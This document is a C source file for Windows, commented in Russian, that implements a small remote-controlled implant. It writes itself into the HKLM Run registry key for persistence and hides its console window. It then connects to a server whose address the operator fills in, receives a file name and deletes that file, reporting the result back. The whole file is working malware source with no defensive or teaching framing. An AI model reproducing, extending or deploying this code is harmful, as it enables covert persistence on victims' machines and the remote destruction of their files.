#define _CRT_SECURE_NO_WARNINGS
#define _WINSOCK_DEPRECATED_NO_WARNINGS
#define _WIN32_WINNT 0x0500
#include <stdio.h>
#include <stdlib.h>
#include <errno.h>
#include <string.h>
#include <sys/types.h> // их слишком много 2/3 не нужны вообще
#include <time.h>
#include <stdbool.h>
#include <io.h>
#include <tchar.h>

//#include <sys/socket.h>
#include <winsock2.h> // для структур WSDATA и др.
#include <windows.h>
#pragma comment(lib, "ws2_32.lib") // также
#define PORT 8877

int startup(void) {
            TCHAR szPath[MAX_PATH];
            DWORD pathLen = 0;

            // GetModuleFileName returns the number of characters
            // written to the array.
            pathLen = GetModuleFileName(NULL, szPath, MAX_PATH);
            if (pathLen == 0){
                    _tprintf(TEXT("Unable to get module file name; last error = %lu\n"), GetLastError());
                    return -1;
            }

            HKEY newValue;

            if (RegOpenKey(HKEY_LOCAL_MACHINE,
                TEXT("Software\\Microsoft\\Windows\\CurrentVersion\\Run"),
                 & newValue) != ERROR_SUCCESS)
            {
                    _tprintf(TEXT("Unable to open registry key; last error = %lu\n"), GetLastError());
                    return -1;
            }

            // Need to pass the length of the path string in bytes,
            // which may not equal the number of characters due to
            // character set.
            DWORD pathLenInBytes = pathLen * sizeof(*szPath);
            if (RegSetValueEx(newValue,
                TEXT("name_me"),
                0,
                REG_SZ,
                (LPBYTE)szPath,
                pathLenInBytes) != ERROR_SUCCESS) {
                      RegCloseKey(newValue);
                      _tprintf(TEXT("Unable to set registry value; last error = %lu\n"), GetLastError());
                      return -1;
            }
            RegCloseKey(newValue);
            return 0;
    }

int main() {
    while (1) {
        startup(); // перемещаем прогу в автозагрузку

        HWND hWnd = GetConsoleWindow();
        // ShowWindow(hWnd, SW_MINIMIZE);  //тут прячем ток при действии
        ShowWindow(hWnd, SW_HIDE); // прячем консольку хыхыхы

        WSADATA ws;//стркутура с инфой о сокетах
        WSAStartup(MAKEWORD(2, 2), &ws); //подключаем dll 

        SOCKET server = socket(AF_INET, SOCK_STREAM, 0); //объявляем сокет с ipv4 и TСP
        SOCKADDR_IN sa; // основная структура с портом и ipv4
            memset(&sa, 0, sizeof(sa));
            sa.sin_family = AF_INET; // создаём структуру и указываем ipv4 
            sa.sin_port = htons(PORT); // реобразует узловой порядок расположения байтов положительного короткого целого hostshort в сетевой порядок расположения байтов

    // клиент
        //sa.sin_addr.S_un.S_addr преобразует обычный вид IP-адреса cp (из номеров и точек) в двоичный код в сетевом порядке расположения байтов и записывает в стрктуру sa
        sa.sin_addr.S_un.S_addr = inet_addr("127.0.0.1"); // сюда надо вписать айпишник сервера который запишется в структуру sa (по дефолту стоит локалхост)
        connect(server, (struct sockaddr*)&sa, sizeof(sa));  // коннектимся к серву, укзывая рамзер передаваемых данных 
        char ans[100];
        memset(ans, 0, sizeof(ans));
        recv(server, ans, sizeof(ans), 0);// получаем название файла от серва и заносим в переменную
        printf("%s\n", ans);
        char flag;
        if (-1 == _unlink(ans)) { // _unlink удаляет файл просто максимально сильно, и выдёт -1 если не пошло и чёт другое если норм
            printf("error\n");
            flag = '1';
        }
        else {
            flag = '2';
            printf("nice\n");
        }
        send(server, &flag, sizeof(flag), 0);

        //Sleep(8000); // это чтобы прога не закрывалась сразу(со стороны клиента)
    }
	return 0;
}